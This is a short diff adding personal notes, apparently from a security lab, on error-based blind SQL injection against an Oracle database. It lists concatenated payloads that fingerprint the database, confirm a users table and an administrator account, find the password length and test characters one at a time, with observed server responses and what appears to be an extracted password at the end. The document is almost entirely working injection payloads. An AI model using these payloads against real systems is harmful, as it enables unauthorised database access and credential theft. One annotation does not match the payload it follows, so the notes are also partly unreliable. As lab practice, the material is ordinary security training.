@@ -1,0 +1,28 @@
+
+' || (select '' from dual) || '
+-> oracle database
+
+' || (select '' from dualfiewjfow) || '
+-> error
+
+' || (select '' from users where rownum =1) || ' 
+-> users table exists
+
+' || (select '' from users where username='administrator') || ' 
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
+-> Internal server error -> administrator user exists
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
+-> 200 response -> user does not exist in database
+
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
+-> 20 characters [0-19]
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || ' 
+-> w is not the first character of the password
+
+wjuc497wl6szhbtf0cbf
